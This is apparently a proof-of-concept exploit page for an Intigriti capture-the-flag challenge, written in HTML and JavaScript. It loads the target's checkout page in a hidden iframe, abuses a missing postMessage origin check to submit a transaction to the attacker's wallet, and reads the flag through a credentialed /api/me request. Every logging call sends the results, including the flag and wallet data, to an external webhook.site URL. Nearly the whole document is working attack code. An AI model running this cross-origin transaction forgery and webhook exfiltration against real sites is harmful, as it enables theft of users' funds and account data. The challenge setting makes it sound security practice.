<!DOCTYPE html>
<html>
<head>
    <title>exploit</title>
    <style>
        body { font-family: monospace; padding: 20px; background: #1a1a1a; color: #0f0; }
        h1 { color: #0f0; }
        #status { color: #ff0; font-size: 18px; }
        #log { color: #0ff; font-size: 12px; max-height: 300px; overflow-y: auto; }
        iframe { display: none; }
    </style>
</head>
<body>
    <h1>Intigriti Challenge - iframe Exploit (No Popups)</h1>
    <p id="status">Initializing...</p>
    <pre id="log">Waiting for bot visit...</pre>

    <!-- Hidden iframe for checkout.html -->
    <iframe id="checkoutFrame" src="about:blank"></iframe>

    <script>
        const TARGET = 'https://challenge-0126.intigriti.io';
        const OUR_WALLET = '16472226db03703a192aa383237035a69f';
        const WEBHOOK = 'https://webhook.site/9480469e-afda-45c7-af6d-93f7006a27b5';

        function log(message, data = {}) {
            console.log(message, data);
            const logEl = document.getElementById('log');
            logEl.textContent += '\n' + message;

            fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                mode: 'no-cors',
                body: JSON.stringify({
                    timestamp: new Date().toISOString(),
                    message: message,
                    data: data
                })
            }).catch(() => {});
        }

        log('PAGE_LOADED');
        document.getElementById('status').textContent = 'Loading checkout...';

        async function exploit() {
            try {
                // Load checkout.html in iframe (same-origin)
                const iframe = document.getElementById('checkoutFrame');
                iframe.src = TARGET + '/checkout.html?currency=1337COIN&price=1';

                log('IFRAME_LOADING', { src: iframe.src });

                // Wait for iframe to load
                await new Promise((resolve) => {
                    iframe.onload = resolve;
                    setTimeout(resolve, 3000); // Fallback timeout
                });

                log('IFRAME_LOADED');

                // Get the iframe's window
                const iframeWindow = iframe.contentWindow;
                if (!iframeWindow) {
                    log('ERROR_NO_IFRAME_WINDOW');
                    document.getElementById('status').textContent = 'Error: Cannot access iframe window';
                    return;
                }

                document.getElementById('status').textContent = 'Sending transaction...';
                log('SENDING_POSTMESSAGE', {
                    toAddress: OUR_WALLET,
                    currency: '1337COIN',
                    amount: 1
                });

                // Send postMessage to iframe (NO origin check!)
                iframeWindow.postMessage({
                    type: 'submitTransaction',
                    transaction: {
                        toAddress: OUR_WALLET,
                        currency: '1337COIN',
                        amount: 1
                    }
                }, '*');

                log('POSTMESSAGE_SENT');
                document.getElementById('status').textContent = 'Transaction sent! Waiting for flag...';

                // Wait for transaction, then check for flag
                setTimeout(async () => {
                    log('CHECKING_FLAG');
                    const response = await fetch(TARGET + '/api/me', { credentials: 'include' });
                    const data = await response.json();

                    log('API_ME_RESPONSE', {
                        hasFlag: !!data.flag,
                        flag: data.flag || 'none',
                        wallets: data.wallets?.map(w => ({ currency: w.currency, address: w.address }))
                    });

                    if (data.flag) {
                        document.getElementById('status').textContent = 'FLAG: ' + data.flag;
                        log('FLAG_FOUND', { flag: data.flag });
                        alert('FLAG: ' + data.flag);
                    } else {
                        document.getElementById('status').textContent = 'No flag yet - checking again...';
                        log('NO_FLAG_YET_RETRY');

                        // Retry once more
                        setTimeout(async () => {
                            const r2 = await fetch(TARGET + '/api/me', { credentials: 'include' });
                            const d2 = await r2.json();
                            log('API_ME_RETRY', { hasFlag: !!d2.flag, flag: d2.flag || 'none' });
                            if (d2.flag) {
                                document.getElementById('status').textContent = 'FLAG: ' + d2.flag;
                                log('FLAG_FOUND_RETRY', { flag: d2.flag });
                                alert('FLAG: ' + d2.flag);
                            }
                        }, 3000);
                    }
                }, 5000);

            } catch (error) {
                log('ERROR', { error: error.message, stack: error.stack });
                document.getElementById('status').textContent = 'Error: ' + error.message;
            }
        }

        // Start when page loads
        window.onload = () => {
            log('WINDOW_ONLOADED');
            exploit();
        };
    </script>
</body>
</html>
